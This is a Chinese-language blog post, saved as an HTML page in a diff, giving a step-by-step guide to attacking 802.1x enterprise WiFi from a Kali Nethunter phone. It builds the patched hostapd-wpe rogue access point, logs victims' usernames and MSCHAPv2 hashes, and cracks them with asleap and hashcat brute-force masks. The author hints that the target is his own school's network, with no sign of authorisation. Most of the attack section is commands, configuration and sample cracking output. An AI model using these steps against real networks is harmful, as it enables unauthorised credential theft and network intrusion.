@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Terminal_180x180.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Terminal_32x32.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Terminal_16x16.png?v=6.4.2">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="背景笔者学校的无线网络采用1x认证方式，所以你懂的。 之前参考GitHub上的一个项目https://github.com/OpenSecurityResearch/hostapd-wpe在Kali2.0上部署成功，但是在手机端的情况比较不同，猜测是因为架构有一定区别所导致的，而且该网页上的Hostapd版本比较低，遂继续查找，找到了aircrack-ng的GitHub的某一个页面上展示了Host">
+<meta name="keywords" content="黑客手机,Kali,无线安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用Kali Nethunter破解802.1x安全性WiFi">
+<meta property="og:url" content="https://nonconformist.me/nethunter-8021x/index.html">
+<meta property="og:site_name" content="ya0guang打哈欠的地方">
+<meta property="og:description" content="背景笔者学校的无线网络采用1x认证方式，所以你懂的。 之前参考GitHub上的一个项目https://github.com/OpenSecurityResearch/hostapd-wpe在Kali2.0上部署成功，但是在手机端的情况比较不同，猜测是因为架构有一定区别所导致的，而且该网页上的Hostapd版本比较低，遂继续查找，找到了aircrack-ng的GitHub的某一个页面上展示了Host">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://nonconformist.me/nethunter-8021x/custom_command.jpg">
+<meta property="og:image" content="https://nonconformist.me/nethunter-8021x/1x_test.jpg">
+<meta property="og:updated_time" content="2017-02-22T09:19:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用Kali Nethunter破解802.1x安全性WiFi">
+<meta name="twitter:description" content="背景笔者学校的无线网络采用1x认证方式，所以你懂的。 之前参考GitHub上的一个项目https://github.com/OpenSecurityResearch/hostapd-wpe在Kali2.0上部署成功，但是在手机端的情况比较不同，猜测是因为架构有一定区别所导致的，而且该网页上的Hostapd版本比较低，遂继续查找，找到了aircrack-ng的GitHub的某一个页面上展示了Host">
+<meta name="twitter:image" content="https://nonconformist.me/nethunter-8021x/custom_command.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="https://nonconformist.me/nethunter-8021x/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>使用Kali Nethunter破解802.1x安全性WiFi | ya0guang打哈欠的地方</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ya0guang打哈欠的地方</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">/Hacker/Photographer/Geek/</h1>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-黑客手机" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://nonconformist.me/nethunter-8021x/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ya0guang">
+      <meta itemprop="description" content="家里蹲青年也不要成为咸鱼">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ya0guang打哈欠的地方">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">使用Kali Nethunter破解802.1x安全性WiFi
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2017-02-10 12:25:57" itemprop="dateCreated datePublished" datetime="2017-02-10T12:25:57+08:00">2017-02-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2017-02-22 17:19:08" itemprop="dateModified" datetime="2017-02-22T17:19:08+08:00">2017-02-22</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>笔者学校的无线网络采用1x认证方式，所以你懂的。</p>
+<p>之前参考GitHub上的一个项目<a href="https://github.com/OpenSecurityResearch/hostapd-wpe" target="_blank" rel="noopener">https://github.com/OpenSecurityResearch/hostapd-wpe</a>在Kali2.0上部署成功，但是在手机端的情况比较不同，猜测是因为架构有一定区别所导致的，而且该网页上的Hostapd版本比较低，遂继续查找，找到了aircrack-ng的GitHub的某一个页面上展示了Hostapd-wpe的用法<a href="https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe" target="_blank" rel="noopener">https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe</a></p>
+<p>页面上写的比较详细，但是实践中笔者还是踩了不少坑，下面开始：</p>
+<font color="red" size="3">注意，本文在Kali 2.0及以上的版本中应该也适用！但是本人没有测试，还请测试通过的朋友留个言</font>
+
+<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><ul>
+<li>pkg-config</li>
+<li>libssl 1.0</li>
+<li>libnl3 (and genl)</li>
+<li>sqlite3</li>
+</ul>
+<p>安装依赖：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libssl1.0-dev libnl-genl-3-dev libnl-3-dev pkg-config libsqlite3-dev</span><br></pre></td></tr></table></figure></p>
+<p>由于手机上敲指令过于蛋疼，笔者自己ssh到了手机上，在Kali的应用中可以直接打开SSH服务。</p>
+<p>用ftp或者wget之类的将patch文件下载到手机上，这里笔者的路径是 ~/1x/ ,执行：</p>
+<p>注:补丁文件<a href="https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-wpe.patch" target="_blank" rel="noopener">https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-wpe.patch</a></p>
+<h2 id="下载、编译、安装"><a href="#下载、编译、安装" class="headerlink" title="下载、编译、安装"></a>下载、编译、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 下载</span><br><span class="line">wget http://hostap.epitest.fi/releases/hostapd-2.6.tar.gz</span><br><span class="line">tar -zxf hostapd-2.6.tar.gz</span><br><span class="line">cd hostapd-2.6</span><br><span class="line"><span class="meta">#</span> 打补丁</span><br><span class="line">patch -p1 &lt; ../hostapd-wpe.patch</span><br><span class="line">cd hostapd</span><br><span class="line"><span class="meta">#</span> 编译安装</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">make wpe</span><br></pre></td></tr></table></figure>
+<h2 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/hostapd-wpe/certs</span><br><span class="line">./bootstrap</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p>这里会出现关于gendh命令未找到的错误，原因是openssl将gendh已经换成了dhparam,在该目录下的Makefile中将gendh替换为dhparam即可。</p>
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>请注意在Nethunter中已经预先安装了hostapd，但是那个版本的hostapd是不支持1x的。所以请切换到我们部署的hostapd目录下，运行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hostapd ./hostapd-wpe.conf</span><br></pre></td></tr></table></figure></p>
+<p>这里的配置文件需要修改，需要修改的地方有：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan1</span><br><span class="line">ssid=YOUR_SSID</span><br><span class="line">driver=nl80211</span><br><span class="line">hw_mode=g</span><br><span class="line"><span class="meta">#</span>fragm_threshold=-1</span><br><span class="line"><span class="meta">#</span>rts_threshold=-1</span><br><span class="line"><span class="meta">#</span> 以上两行需要添加注释</span><br></pre></td></tr></table></figure></p>
+<p>之后再运行，即可成功。日志的数据为该目录下的hostapd-wpe.log文件，其记载了用户的用户名和MSCHAPv2认证hash值。</p>
+<h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><p>由于采用MSCHAPv2认证，所以密码并不会明文显示。主要有两种方法，其一是直接用系统中的工具asleep进行破解，举个栗子：</p>
+<h2 id="asleep"><a href="#asleep" class="headerlink" title="asleep"></a>asleep</h2><p>采集到的日志样例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: jdslfkjs</span><br><span class="line">challenge: bc:87:6c:48:37:d3:92:6e</span><br><span class="line">response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist</span><br><span class="line">asleap 2.2 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;</span><br><span class="line">hash bytes:        b1ca</span><br><span class="line">NT hash:           e614b958df9df49ec094b8730f0bb1ca</span><br><span class="line">password:          bradtest</span><br></pre></td></tr></table></figure></p>
+<p>其中wordlist需要自己准备</p>
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>另一种方法是利用hashcat进行破解，其好处是可以根据掩码实时生产字典爆破而且可以使用GPU+CPU资源进行破解，速度比较科学。</p>
+<p>关于hashcat的获取，请去官方网站<a href="https://hashcat.net/" target="_blank" rel="noopener">https://hashcat.net/</a>下载。</p>
+<h3 id="hashcat-brief-introduction"><a href="#hashcat-brief-introduction" class="headerlink" title="hashcat brief introduction"></a>hashcat brief introduction</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat [选项] ... hash|hashfile|hccapfile [字典|掩码|路径]</span><br><span class="line">-m, --hash-type        /哈希值类型，我们使用5500 NetNTLMv1</span><br><span class="line">-a, --attack-mode      /攻击模式，这里使用3 暴力破解</span><br><span class="line">-d, --opencl-devices   /使用设备，1：CPU 2：GPU 3：FPGA，DSP</span><br><span class="line">-o, --outfile          /输出文件路径-i, --incerment        /掩码破击时使用，设置掩码上下限</span><br></pre></td></tr></table></figure>
+<p>笔者这里使用的参数如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.exe -d 1 -a 3 -m 5500 -o "output path" -i --increment-min=1 --increment-max=8 -1 ?l "input filepath" ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure></p>
+<p>其中，-1 ?l 代表定义1号掩码的格式为所有小写字母，参考掩码：</p>
+<h3 id="hashcat-maskcode"><a href="#hashcat-maskcode" class="headerlink" title="hashcat maskcode"></a>hashcat maskcode</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">? | Charset</span><br><span class="line">===+=========</span><br><span class="line">l | abcdefghijklmnopqrstuvwxyz</span><br><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">d | 0123456789</span><br><span class="line">s |  !"#$%&amp;'()*+,-./:;=?@[\]^_`&#123;|&#125;~</span><br><span class="line">a | ?l?u?d?s</span><br><span class="line">b | 0x00 - 0xff</span><br></pre></td></tr></table></figure>
+<p>将之前得到的输出结果按照<br>username::::response:challenge<br>的格式存储在文本文档中，注意去掉hash值中的冒号。运行hashcat</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>为了方便起见，可以将其作为用户定义脚本存储在nethunter的custom command中：<br><img src="/nethunter-8021x/custom_command.jpg" title="[OP3 customcommand]"></p>
+<p>运行截图：<br><img src="/nethunter-8021x/1x_test.jpg" title="[OP3 test1x]"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>早餐加俩蛋</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ya0guang WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ya0guang Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/黑客手机/" rel="tag"># 黑客手机</a>
+          
+            <a href="/tags/Kali/" rel="tag"># Kali</a>
+          
+            <a href="/tags/无线安全/" rel="tag"># 无线安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/OP3-initial/" rel="next" title="一加3 Kali Nethunter初体验">
+                <i class="fa fa-chevron-left"></i> 一加3 Kali Nethunter初体验
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/lowcost-badUSB/" rel="prev" title="低成本安全硬件（一）——BadUSB on Arduino">
+                低成本安全硬件（一）——BadUSB on Arduino <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="ya0guang">
+            
+              <p class="site-author-name" itemprop="name">ya0guang</p>
+              <p class="site-description motion-element" itemprop="description">家里蹲青年也不要成为咸鱼</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">Tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#依赖"><span class="nav-number">2.</span> <span class="nav-text">依赖</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载、编译、安装"><span class="nav-number">2.1.</span> <span class="nav-text">下载、编译、安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#制作证书"><span class="nav-number">2.2.</span> <span class="nav-text">制作证书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#运行"><span class="nav-number">2.3.</span> <span class="nav-text">运行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#破解"><span class="nav-number">3.</span> <span class="nav-text">破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#asleep"><span class="nav-number">3.1.</span> <span class="nav-text">asleep</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hashcat"><span class="nav-number">3.2.</span> <span class="nav-text">hashcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hashcat-brief-introduction"><span class="nav-number">3.2.1.</span> <span class="nav-text">hashcat brief introduction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashcat-maskcode"><span class="nav-number">3.2.2.</span> <span class="nav-text">hashcat maskcode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ya0guang</span>
+
+  
+
+  
+</div>
+
+
+  
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" rel="external nofollow" href="https://theme-next.org">NexT.Pisces</a> v6.4.2</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
